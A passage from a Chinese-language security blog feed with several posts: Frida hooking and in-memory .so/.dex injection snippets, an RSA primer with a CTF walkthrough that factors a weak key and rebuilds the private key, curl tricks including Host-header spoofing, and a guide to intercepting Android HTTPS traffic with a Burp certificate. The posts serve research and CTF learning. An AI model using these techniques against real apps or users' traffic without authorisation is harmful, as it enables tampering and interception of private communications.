class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Interceptor.attach(Module.getExportByName(&apos;libnative-lib.so&apos;, &apos;Jniint&apos;), &#123;</span><br><span class="line">    onEnter: function(args) &#123;</span><br><span class="line">      this.first = args[0].toInt32(); // int</span><br><span class="line">      console.log(&quot;on enter with: &quot; + this.first)</span><br><span class="line">    &#125;,</span><br><span class="line">    onLeave: function(retval) &#123;</span><br><span class="line">      const dstAddr = Java.vm.getEnv().newIntArray(1117878);</span><br><span class="line">      console.log(&quot;dstAddr is : &quot; + dstAddr.toInt32())</span><br><span class="line">      retval.replace(dstAddr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="18-枚举native导出函数"><a href="#18-枚举native导出函数" class="headerlink" title="18.枚举native导出函数"></a>18.枚举native导出函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//enumerateExports(null,...   所有lib</span><br><span class="line">Module.enumerateExports(&quot;mylib.so&quot;, &#123;</span><br><span class="line">    onMatch: function(e) &#123;</span><br><span class="line">        if (e.type == &apos;function&apos;) &#123;</span><br><span class="line">            console.log(&quot;name of function = &quot; + e.name);</span><br><span class="line"></span><br><span class="line">            if (e.name == &quot;Java_example_decrypt&quot;) &#123;</span><br><span class="line">                console.log(&quot;Function Decrypt recognized by name&quot;);</span><br><span class="line">                Interceptor.attach(e.address, &#123;</span><br><span class="line">                    onEnter: function(args) &#123;</span><br><span class="line">                        console.log(&quot;Interceptor attached onEnter...&quot;);</span><br><span class="line">                    &#125;,</span><br><span class="line">                    onLeave: function(retval) &#123;</span><br><span class="line">                        console.log(&quot;Interceptor attached onLeave...&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    onComplete: function() &#123;&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="19-内存中注入so和dex"><a href="#19-内存中注入so和dex" class="headerlink" title="19.内存中注入so和dex"></a>19.内存中注入so和dex</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">module_libex = Module.load(&quot;/data/local/tmp/xxx.so&quot;)</span><br><span class="line">//so如果有依赖其他，也需要注入内存</span><br><span class="line"></span><br><span class="line">Java.openClassFile(&quot;/data/local/tmp/xxxx.dex&quot;).load()</span><br><span class="line">//dx 制作 dex, push 到手机里  或者 编译一个helloword带上lib</span><br></pre></td></tr></table></figure><h3 id="20-使用google的gson打印object"><a href="#20-使用google的gson打印object" class="headerlink" title="20.使用google的gson打印object"></a>20.使用google的gson打印object</h3><p>参考：<a href="https://bbs.pediy.com/thread-259186.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-259186.htm</a></p><h3 id="21-利用反射找类的Interface"><a href="#21-利用反射找类的Interface" class="headerlink" title="21.利用反射找类的Interface"></a>21.利用反射找类的Interface</h3><p><a href="https://bbs.pediy.com/thread-259631.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-259631.htm</a></p><p>其他参考链接</p><ol><li><a href="https://github.com/FloatingGuy/fg-Blog/blob/7df0bd47b42d11b787fe394259fa30288307ae48/source/_posts/%E5%BC%80%E5%8F%91/frida%20hook%20%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C.md" target="_blank" rel="noopener">https://github.com/FloatingGuy/fg-Blog/blob/7df0bd47b42d11b787fe394259fa30288307ae48/source/_posts/%E5%BC%80%E5%8F%91/frida%20hook%20%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C.md</a></li><li>r0ysue的相关文章  <a href="https://bbs.pediy.com/user-home-581423.htm" target="_blank" rel="noopener">https://bbs.pediy.com/user-home-581423.htm</a></li><li>Frida学习笔记  <a href="https://api-caller.com/2019/03/30/frida-note/#%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%A0%86%E6%A0%88" target="_blank" rel="noopener">https://api-caller.com/2019/03/30/frida-note/#%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%A0%86%E6%A0%88</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>RSA算法原理及应用破解</title>
      <link href="/2018/03/06/RSA%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8%E7%A0%B4%E8%A7%A3/"/>
      <url>/2018/03/06/RSA%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>RSA算法是现今使用广泛的公钥密码算法，也是号称地球上最安全的加密算法。在了解RSA算法之前，先熟悉下几个术语<br>根据密钥的使用方法，可以将密码分为对称密码和公钥密码<br>对称密码：加密和解密使用同一种密钥的方式<br>公钥密码：加密和解密使用不同的密码的方式，因此公钥密码通常也称为非对称密码。<br><a id="more"></a></p><h1 id="RSA算法原理"><a href="#RSA算法原理" class="headerlink" title="RSA算法原理"></a>RSA算法原理</h1><p>该部分转自<a href="http://blog.csdn.net/dbs1215/article/details/48953589" target="_blank" rel="noopener">http://blog.csdn.net/dbs1215/article/details/48953589</a></p><h2 id="RSA加密"><a href="#RSA加密" class="headerlink" title="RSA加密"></a>RSA加密</h2><p>RSA的加密过程可以使用一个通式来表达，也就是说RSA加密是对明文的E次方后除以N后求余数的过程。</p><p><img src="/images/pasted-13.png" alt="upload successful"></p><p>从通式可知，只要知道E和N任何人都可以进行RSA加密了，所以说E、N是RSA加密的密钥，也就是说E和N的组合就是公钥，我们用(E,N)来表示公钥<br><img src="/images/pasted-14.png" alt="upload successful"><br>不过E和N不并不是随便什么数都可以的，它们都是经过严格的数学计算得出的，关于E和N拥有什么样的要求及其特性后面会讲到。顺便啰嗦一句E是加密（Encryption）的首字母，N是数字（Number）的首字母</p><h2 id="RSA解密"><a href="#RSA解密" class="headerlink" title="RSA解密"></a>RSA解密</h2><p>RSA的解密过程也可以使用一个通式来表达，即对密文的D次方后除以N后求余数的过程。</p><p><img src="/images/pasted-15.png" alt="upload successful"><br>这就是RSA解密过程。知道D和N就能进行解密密文了，所以D和N的组合就是私钥。</p><p><img src="/images/pasted-16.png" alt="upload successful"></p><p>总结如下表：</p><p><img src="/images/pasted-17.png" alt="upload successful"></p><h2 id="生成秘钥对"><a href="#生成秘钥对" class="headerlink" title="生成秘钥对"></a>生成秘钥对</h2><p>既然公钥是（E，N），私钥是（D，N）所以密钥对即为（E，D，N）但密钥对是怎样生成的？</p><p>密钥对生成分求N、求L（L为中间过程的中间数,详见下文描述）、求E和求D以下几个步骤：</p><h3 id="求N"><a href="#求N" class="headerlink" title="求N"></a>求N</h3><p>准备两个质数p，q。这两个数不能太小，太小则会容易破解，将p乘以q就是N</p><p><img src="/images/pasted-18.png" alt="upload successful"></p><h3 id="求L（L为中间过程的中间数）"><a href="#求L（L为中间过程的中间数）" class="headerlink" title="求L（L为中间过程的中间数）"></a>求L（L为中间过程的中间数）</h3><p>L 是 p－1 和 q－1的最小公倍数，可用如下表达式表示：</p><p><img src="/images/pasted-19.png" alt="upload successful"></p><h3 id="求E"><a href="#求E" class="headerlink" title="求E"></a>求E</h3><p>E必须满足两个条件：E是一个比1大比L小的数，E和L的最大公约数为1<br>用gcd(X,Y)来表示X，Y的最大公约数则E条件如下：</p><p><img src="/images/pasted-20.png" alt="upload successful"><br>之所以需要E和L的最大公约数为1是为了保证一定存在解密时需要使用的数D。现在我们已经求出了E和N也就是说我们已经生成了密钥对中的公钥了。</p><h3 id="求D"><a href="#求D" class="headerlink" title="求D"></a>求D</h3><p>数D是由数E计算出来的。D、E和L之间必须满足以下关系：</p><p><img src="/images/pasted-21.png" alt="upload successful"><br>只要D满足上述2个条件，则通过E和N进行加密的密文就可以用D和N进行解密。<br>简单地说条件2是为了保证密文解密后的数据就是明文。<br>现在私钥自然也已经生成了，密钥对也就自然生成了。 </p><p>生成秘钥对总结如下：</p><p><img src="/images/pasted-22.png" alt="upload successful"></p><h2 id="实践举例"><a href="#实践举例" class="headerlink" title="实践举例"></a>实践举例</h2><p>5.1 求N<br>我们准备两个很小对质数，<br>p ＝ 17<br>q ＝ 19<br>N ＝ p ＊ q ＝ 323</p><p>5.2 求L<br>L ＝ lcm（p－1， q－1）＝ lcm(16，18） ＝ 144<br>144为16和18对最小公倍数</p><p>5.3 求E<br>求E必须要满足2个条件：1 &lt; E &lt; L ，gcd（E，L）=1<br>即1 &lt; E &lt; 144，gcd（E，144） ＝ 1<br>E和144互为质数，5显然满足上述2个条件<br>故E ＝ 5</p><p>此时公钥=(E，N）＝ （5，323）</p><p>5.4 求D<br>求D也必须满足2个条件：1 &lt; D &lt; L，E＊D mod L ＝ 1<br>即1 &lt; D &lt; 144，5 ＊ D mod 144 ＝ 1<br>显然当D＝ 29 时满足上述两个条件<br>1 &lt; 29 &lt; 144<br>5＊29 mod 144 ＝ 145 mod 144 ＝ 1<br>此时私钥＝（D，N）＝（29，323）</p><p>5.5 加密<br>准备的明文必须时小于N的数，因为加密或者解密都要mod N其结果必须小于N<br>假设明文 ＝ 123<br>则 密文＝明文EmodN＝1235mod323=225<br>5.6 解密<br>明文＝密文DmodN＝22529mod323=123<br>解密后的明文为123。</p><p>一个直观的解释如下：</p><blockquote><p>123的5次方mod323==Math.pow(123d, 5d) % 323d可以直接计算出是225；<br>再说5.6:<br>因为225的29次方数值太大，直接运算会导致取模结果获取错误结果；可以这样求解<br>(225的5次方mod323)==4;(225的4次方mod323)==290所以<br>225的29次方mod323==(225的5次方mod323)<em>(225的5次方mod323)</em>(225的5次方mod323)<em>(225的5次方mod323)</em>(225的5次方mod323)<em>(225的4次方mod323) mod323==(4 </em> 4 <em> 4 </em> 4 <em> 290 </em> 4) % 323==123</p></blockquote><h1 id="RSA实现破解"><a href="#RSA实现破解" class="headerlink" title="RSA实现破解"></a>RSA实现破解</h1><p>RSA在软件逆向或加解密类的ctf题目中经常看到。在实际应用中，参数N和E是公开的但是D是私有的并且绝不能公开！两个大素数P和Q在生成密钥后便不再需要了，但是必须销毁，否则就可以推算出D。</p><p>为了从公钥(N,E)得到D,需要试图分解N为它的两个素数因子。对于一个很大的模数N（512位或更大）要想分解出它的P和Q是件非常困难的事。</p><h2 id="ctf题目一"><a href="#ctf题目一" class="headerlink" title="ctf题目一"></a>ctf题目一</h2><p>题目：给出密文flag.enc和公钥public.pem,解出密文<br>解题过程如下：</p><ol><li>openssl分析公钥，得到N,E<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -pubin -text -modulus -in public.pem</span><br></pre></td></tr></table></figure></li></ol><p><img src="/images/pasted-23.png" alt="upload successful"></p><p>其中，Modulus 是n的值，Exponent是E的值。</p><ol><li>使用<a href="https://sourceforge.net/projects/msieve/" target="_blank" rel="noopener">msieve工具</a>对N进行分解<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msieve.exe 0xA41006DEFD378B7395B4E2EB1EC9BF56A61CD9C3B5A0A73528521EEB2FB817A7 -v</span><br></pre></td></tr></table></figure></li></ol><p>分解结果如下：</p><blockquote><p>Msieve v. 1.53 (SVN 1005)<br>Wed Feb 28 23:00:33 2018<br>random seeds: f922db80 d61d4d18<br>factoring 74207624142945242263057035287110983967646020057307828709587969646701361764263 (77 digits)<br>searching for 15-digit factors<br>commencing quadratic sieve (77-digit input)<br>using multiplier of 7<br>using generic 32kb sieve core<br>sieve interval: 12 blocks of size 32768<br>processing polynomials in batches of 17<br>using a sieve bound of 921409 (36471 primes)<br>using large prime bound of 92140900 (26 bits)<br>using trial factoring cutoff of 26 bits<br>polynomial ‘A’ values have 10 factors<br>restarting with 19771 full and 188452 partial relations</p><p>36803 relations (19771 full + 17032 combined from 188452 partial), need 36567<br>sieving complete, commencing postprocessing<br>begin with 208223 relations<br>reduce to 51729 relations in 2 passes<br>attempting to read 51729 relations<br>recovered 51729 relations<br>recovered 38607 polynomials<br>attempting to build 36803 cycles<br>found 36803 cycles in 1 passes<br>distribution of cycle lengths:<br>   length 1 : 19771<br>   length 2 : 17032<br>largest cycle: 2 relations<br>matrix is 36471 x 36803 (5.3 MB) with weight 1102159 (29.95/col)<br>sparse part has weight 1102159 (29.95/col)<br>filtering completed in 3 passes<br>matrix is 24858 x 24922 (4.0 MB) with weight 836197 (33.55/col)<br>sparse part has weight 836197 (33.55/col)<br>saving the first 48 matrix rows for later<br>matrix includes 64 packed rows<br>matrix is 24810 x 24922 (2.6 MB) with weight 611256 (24.53/col)<br>sparse part has weight 439905 (17.65/col)<br>commencing Lanczos iteration<br>memory use: 2.7 MB<br>lanczos halted after 394 iterations (dim = 24805)<br>recovered 14 nontrivial dependencies<br>p39 factor: 258631601377848992211685134376492365269<br>p39 factor: 286924040788547268861394901519826758027<br>elapsed time 00:00:06</p></blockquote><p>两个p39 factor为p和q,这里是10进制表示</p><ol><li>生成私钥<br>知道了N，e,p,q，就可以生成私钥了<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import math</span><br><span class="line">import sys</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line"></span><br><span class="line">keypair = RSA.generate(1024)</span><br><span class="line"></span><br><span class="line">keypair.p = 0xD7DB8F68BCEC6D7684B37201385D298B</span><br><span class="line">keypair.q = 0xC292A272E8339B145D9DF674B9A875D5</span><br><span class="line">keypair.e = 65537</span><br><span class="line"></span><br><span class="line">keypair.n = keypair.p * keypair.q</span><br><span class="line">Qn = long((keypair.p-1) * (keypair.q-1))</span><br><span class="line"></span><br><span class="line">i = 1</span><br><span class="line">while (True):</span><br><span class="line">    x = (Qn * i ) + 1</span><br><span class="line">    if (x % keypair.e == 0):</span><br><span class="line">        keypair.d = x / keypair.e</span><br><span class="line">        break</span><br><span class="line">    i += 1</span><br><span class="line"></span><br><span class="line">private = open(&apos;private.pem&apos;,&apos;w&apos;)</span><br><span class="line">private.write(keypair.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure></li></ol><p>注：生成的私钥会默认base64加密。</p><p>密钥解密密文<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -in flag.enc -inkey private.pem -out flag.txt</span><br><span class="line">cat flag.txt </span><br><span class="line">ISG&#123;256bit_is_weak&#125;</span><br></pre></td></tr></table></figure></p><p>附：<br>常用工具下载地址<br>RSA-tool 2 <a href="http://www.skycn.net/soft/appid/39911.html" target="_blank" rel="noopener">http://www.skycn.net/soft/appid/39911.html</a></p><p>msieve <a href="https://sourceforge.net/projects/msieve/" target="_blank" rel="noopener">https://sourceforge.net/projects/msieve/</a></p><p>yafu <a href="https://sourceforge.net/projects/yafu/" target="_blank" rel="noopener">https://sourceforge.net/projects/yafu/</a></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>curl用法</title>
      <link href="/2018/03/06/curl%E7%94%A8%E6%B3%95/"/>
      <url>/2018/03/06/curl%E7%94%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="批量下载"><a href="#批量下载" class="headerlink" title="批量下载"></a>批量下载</h2><ul><li>-O表示下载后的文件名和服务端的文件名一样<br>curl -O <a href="http://45.77.10.219/2018-02-2[6-8].html" target="_blank" rel="noopener">http://45.77.10.219/2018-02-2[6-8].html</a></li><li>-o指定下载后的文件名<br>curl -o “#1.html” <a href="http://45.77.10.219/2018-02-2[6-8].html" target="_blank" rel="noopener">http://45.77.10.219/2018-02-2[6-8].html</a><br>(#1表示可变参数，该命令结果为6.html,7.html,8.html)<a id="more"></a></li></ul><h2 id="模拟请求"><a href="#模拟请求" class="headerlink" title="模拟请求"></a>模拟请求</h2><h3 id="获取服务器http头信息"><a href="#获取服务器http头信息" class="headerlink" title="获取服务器http头信息"></a>获取服务器http头信息</h3><p>curl -i <a href="https://www.baidu.com" target="_blank" rel="noopener">https://www.baidu.com</a></p><h3 id="添加User-Agent"><a href="#添加User-Agent" class="headerlink" title="添加User-Agent"></a>添加User-Agent</h3><p>curl -i -A “Mazilla/4.0 (compatible;MSIE 6.0;Windows NT5.0)” <a href="https://www.baidu.com" target="_blank" rel="noopener">https://www.baidu.com</a></p><p><img src="/images/pasted-12.png" alt="upload successful"></p><h3 id="使用代理"><a href="#使用代理" class="headerlink" title="使用代理"></a>使用代理</h3><p>curl -x 114.115.140.25:3128 <a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a></p><h3 id="指定refer"><a href="#指定refer" class="headerlink" title="指定refer"></a>指定refer</h3><p>对于验证refer的服务器，如防止倒链等可以指定refer<br>curl -e ‘<a href="http://www.baidu.com" target="_blank" rel="noopener">http://www.baidu.com</a>‘ <a href="https://map.baidu.com" target="_blank" rel="noopener">https://map.baidu.com</a></p><h3 id="设置访问域名的主机头突破服务器端限制"><a href="#设置访问域名的主机头突破服务器端限制" class="headerlink" title="设置访问域名的主机头突破服务器端限制"></a>设置访问域名的主机头突破服务器端限制</h3><p>在某些情况下服务器可能禁止通过IP直接访问，或者与需要通特定的域名、主机头才能访问你需要访问的内容，但是此域名DNS还没有解析，或者DNS解析的域名是多个IP，，不能到你需要的IP，你需要让它解析成你需要的特定IP。</p><p>curl  –header “Host:www.freebuf.com” <a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a></p><p>在较新版本的curl还支持一个为例子显示下：–resolve的选项，可以直接用来指定对url的解析</p><p>curl –resolve www.freebuf.com:80:127.0.0.1 <a href="http://www.freebuf.com" target="_blank" rel="noopener">http://www.freebuf.com</a></p><h3 id="设置POST表单实现web认证"><a href="#设置POST表单实现web认证" class="headerlink" title="设置POST表单实现web认证"></a>设置POST表单实现web认证</h3><p>找到登录页的表单，获取用户名和密码的表单值，例如为user何pass</p><p>curl -d “user=name&amp;pass=pass” 登陆URL</p><h3 id="带cookie访问"><a href="#带cookie访问" class="headerlink" title="带cookie访问"></a>带cookie访问</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.curl -D cookiename -d “user=name&amp;pass=pass” https://www.xxx.com （通过口令获取cookie，并保存为文件）</span><br><span class="line">2.cat cookie 验证下cookie</span><br><span class="line">3.curl -b cookiename https://www.xxx.com (带着cookie访问)</span><br></pre></td></tr></table></figure><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>例如对于如下表单：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -F "file=@local_a.txt;filename=testaaabcd.txt" http://www.a.com/file</span><br></pre></td></tr></table></figure></p><p>上传文件，local_a.txt为本地路径，文件名称为testaaabcd.txt</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Android Https抓包实践</title>
      <link href="/2018/03/05/https%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/"/>
      <url>/2018/03/05/https%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>平时的安全研究经常会有抓包的需求，随着互联网厂商安全意识的不断提高，多数Android APP采用了https协议和服务端进行通信，增加了中间人攻击的难度。</p><p>在使用burpsuilt、Fiddler等工具抓https数据包时，通常需要在手机上安装一个证书，即便这样仍然还会出现抓不到包等各种各样的错误和问题，为了解决这些问题，有必要了解下https的原理和实现，方可在遇到问题时根据不同的情况来解决。</p><p>文章有点长，搞个图便于以后采坑定位：</p><p><img src="/images/pasted-194.png" alt="upload successful"></p><h2 id="什么是证书"><a href="#什么是证书" class="headerlink" title="什么是证书"></a>什么是证书</h2><p>这里的证书是指https数字证书，为了防止被中间人挟持，整个互联网都在由http向https切换，证书是https协议中的一个重要角色，本质上证书被用来验证“一个站点是不是真正的站点”。下图是https的协议过程，其中第4阶段就是证书的校验阶段</p><p><img src="/images/pasted-11.png" alt="upload successful"></p><p>那么如何通过证书来验证“一个站点是不是真正的站点”呢？首先从证书的内容说起。</p><p>使用openssl可以查看证书的内容，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">openssl x509  -noout -text -in  kubernetes.pem</span><br><span class="line"></span><br><span class="line">Certificate:</span><br><span class="line">    Data:</span><br><span class="line">        Version: 3 (0x2)</span><br><span class="line">        Serial Number:</span><br><span class="line">            06:6c:9f:d7:c1:bb:10:4c:29:43:e5:71:7b:7b:2c:c8:1a:c1:0e</span><br><span class="line">    Signature Algorithm: ecdsa-with-SHA384</span><br><span class="line">        Issuer: C=US, O=Amazon, CN=Amazon Root CA 4</span><br><span class="line">        Validity</span><br><span class="line">            Not Before: May 26 00:00:00 2015 GMT</span><br><span class="line">            Not After : May 26 00:00:00 2040 GMT</span><br><span class="line">        Subject: C=US, O=Amazon, CN=Amazon Root CA 4</span><br><span class="line">        Subject Public Key Info:</span><br><span class="line">            Public Key Algorithm: id-ecPublicKey</span><br><span class="line">                Public-Key: (384 bit)</span><br><span class="line">                pub:</span><br><span class="line">                    04:d2:ab:8a:37:4f:a3:53:0d:fe:c1:8a:7b:4b:a8:</span><br><span class="line">                    7b:46:4b:63:b0:62:f6:2d:1b:db:08:71:21:d2:00:</span><br><span class="line">                    e8:63:bd:9a:27:fb:f0:39:6e:5d:ea:3d:a5:c9:81:</span><br><span class="line">                    aa:a3:5b:20:98:45:5d:16:db:fd:e8:10:6d:e3:9c:</span><br><span class="line">                    e0:e3:bd:5f:84:62:f3:70:64:33:a0:cb:24:2f:70:</span><br><span class="line">                    ba:88:a1:2a:a0:75:f8:81:ae:62:06:c4:81:db:39:</span><br><span class="line">                    6e:29:b0:1e:fa:2e:5c</span><br><span class="line">                ASN1 OID: secp384r1</span><br><span class="line">                NIST CURVE: P-384</span><br><span class="line">        X509v3 extensions:</span><br><span class="line">            X509v3 Basic Constraints: critical</span><br><span class="line">                CA:TRUE</span><br><span class="line">            X509v3 Key Usage: critical</span><br><span class="line">                Digital Signature, Certificate Sign, CRL Sign</span><br><span class="line">            X509v3 Subject Key Identifier:</span><br><span class="line">                D3:EC:C7:3A:65:6E:CC:E1:DA:76:9A:56:FB:9C:F3:86:6D:57:E5:81</span><br><span class="line">    Signature Algorithm: ecdsa-with-SHA384</span><br><span class="line">         30:65:02:30:3a:8b:21:f1:bd:7e:11:ad:d0:ef:58:96:2f:d6:</span><br><span class="line">         eb:9d:7e:90:8d:2b:cf:66:55:c3:2c:e3:28:a9:70:0a:47:0e:</span><br><span class="line">         f0:37:59:12:ff:2d:99:94:28:4e:2a:4f:35:4d:33:5a:02:31:</span><br><span class="line">         00:ea:75:00:4e:3b:c4:3a:94:12:91:c9:58:46:9d:21:13:72:</span><br><span class="line">         a7:88:9c:8a:e4:4c:4a:db:96:d4:ac:8b:6b:6b:49:12:53:33:</span><br><span class="line">         ad:d7:e4:be:24:fc:b5:0a:76:d4:a5:bc:10</span><br></pre></td></tr></table></figure></p><p>客户端通过证书来验证服务端的合法性，包括：</p><pre><code>1. 验证证书的颁发机构是否受浏览器信任2. 验证证书的有效期3. 验证部署SSL证书的网站域名与证书颁发的域名是否一致</code></pre><p>等等。</p><p>到这里可能有些晕了，证书本来就在客户端放着，怎么自己校验自己？其实https协议中的证书分服务端证书和客户端证书，部署https环境的时候会要求生成这两个证书，证书校验是指用“客户端的证书来校验服务端的证书”，他们两个是PKI体系，客户端证书里有一个字段是CA的公钥，用于解开服务端证书的内容以进行下一步的校验。</p><p>通常，在浏览器中会内置一些根证书，如果网站的证书是这些信任根发的或者信任根的二级证书机构颁发的，那么浏览器才会同服务器发起ssl连接。如果验证失败，则拒绝连接。证书的校验包括证书是否过期、域名和服务器域名是否一致等等，由于用户只是作为浏览网页的角色，这些校验功能由浏览器或操作系统的内置代码来完成。</p><p>不同于浏览器，APP除了靠系统或浏览器，还可以自己实现代码来校验证书，因此在APP中证书校验通常存在三种情况：</p><ol><li><p>APP通过系统和浏览器校验证书；</p></li><li><p>APP自己校验证书，也叫证书绑定；</p></li><li><p>APP除了校验服务端的证书，服务端还可以校验APP的证书，即https双向校验；</p></li></ol><p>本文主要基于Android平台对以上三种情况下的中间人攻击（抓包）进行分析。</p><h2 id="Android平台下https抓包实践"><a href="#Android平台下https抓包实践" class="headerlink" title="Android平台下https抓包实践"></a>Android平台下https抓包实践</h2><p>对于中间人来说，能成功攻击的核心在于“如何让客户端认为我是服务端？”。在现有https协议不变的情况下，中间人既要当真实客户端的“服务者”，又要当真实服务端的“客户”，作为https协议下的“服务者”，自然是需要给客户端提供证书的，因此，在有证书校验的前提下，问题就变成了“如何让客户端信任中间人的证书？”</p><p>我们将根据上述三种情况分别分析：</p><h3 id="1-APP通过系统和浏览器校验证书"><a href="#1-APP通过系统和浏览器校验证书" class="headerlink" title="1. APP通过系统和浏览器校验证书"></a>1. APP通过系统和浏览器校验证书</h3><p>由于证书校验是由系统或浏览器完成，那么只需要系统或浏览器信任中间人的证书即可，现有的操作系统或浏览器都有导入可信证书的功能，因此通过这些功能直接导入中间人的证书即可，这也解释了为什么burpsuilt、Fiddler等工具在抓包时需要往手机里导入一个证书，信任了证书后的攻击过程就由这些工具来搞定了。<br>这里以burpsuit为例，贴出在Android上导入burp证书的方法：</p><h4 id="（1）从设置中手动导入证书"><a href="#（1）从设置中手动导入证书" class="headerlink" title="（1）从设置中手动导入证书"></a>（1）从设置中手动导入证书</h4><ul><li>1.代理都设置开启好之后，在浏览器访问<a href="http://burp" target="_blank" rel="noopener">http://burp</a> ，点击”CA Certificate”下载证书-“cacert.der”</li></ul><p><img src="/images/pasted-186.png" alt="upload successful"></p><ul><li>2.重命名cacert.der 为cacert.cer或cacert.crt，并导入到手机</li></ul><p>由于<strong>android 只支持导入以.crt 或.cer 后缀的文件形式保存的PEM格式或DER格式的证书</strong>(这里注意区分后缀和格式)，如下图所示。<br><img src="/images/pasted-187.png" alt="upload successful"><br>而burp导出的证书是DER后缀的DER格式，因此需要重命名为.crt或.cer后缀。很多文章说要用firfox或openssl等工具转换一下格式，其实只要换一个后缀就行了，详情可以参考burp官方教程<a href="https://support.portswigger.net/customer/portal/articles/1841102-installing-burp-s-ca-certificate-in-an-android-device" target="_blank" rel="noopener">https://support.portswigger.net/customer/portal/articles/1841102-installing-burp-s-ca-certificate-in-an-android-device</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//使用openssl转换证书格式，这里不需要了但还是贴一下吧</span><br><span class="line">openssl x509 -inform PEM -outform DER -in ca_cert.crt -out ca_cert_der.crt</span><br></pre></td></tr></table></figure></p><ul><li>3.安装证书<br>设置-&gt; 安全-&gt; 用户凭据 -&gt; 从存储设备安装（证书），选择刚导入到手机里的证书即可。需要注意的是必须要设置锁屏密码才可以。</li></ul><p><img src="/images/pasted-189.png" alt="upload successful"><br>完成后在设置-&gt; 安全-&gt; 用户凭据 -&gt;信任的凭据 中可查看刚刚安装的证书。</p><p><img src="/images/pasted-190.png" alt="upload successful"><br>之后，配置好客户端的代理ip和端口就可以抓包了。</p><p>然而，安卓7.0之后有了network-security-config选项<a href="https://android-developers.googleblog.com/2016/07/changes-to-trusted-certificate.html" target="_blank" 